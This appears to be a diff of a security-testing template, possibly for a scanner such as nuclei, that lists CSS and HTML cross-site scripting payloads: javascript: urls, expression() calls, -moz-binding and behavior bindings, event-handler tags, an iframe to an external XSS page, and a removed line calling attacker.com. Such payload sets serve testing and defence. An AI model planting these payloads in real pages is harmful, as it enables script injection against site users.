@@ -8,15 +8,12 @@ info:
     </div>
     <div class="form-container">
         <style>
-        @import "javascript:alert('XSS')";
         width: expression(alert('XSS'));
         background: url("javascript:alert('XSS')");
         body {
           -moz-binding: url("data:text/xml;base64,...");
         }
-        @keyframes xss {
-          from { background: url('javascript:alert(1)'); }
-        }
+
         body { animation: xss 1s; }
         body {
           behavior: url(xss.htc);
@@ -28,12 +25,10 @@ info:
         body {
           background: var(--xss);
         }
-        @supports (display: flex) {
-          body { background: url('https://attacker.com/flex-supported'); }
-        }
+
         </script>
         <img onany=a(1) src=x id=1 what=a on=1 1=1 t=t t=1 w="1">
-        <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
+        <xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
         
         <iframe src="https://megaman777.github.io/xss/"></iframe>
         <img src="https://nuclei-us-west-1.s3.us-west-1.amazonaws.com/nuclei.svg">
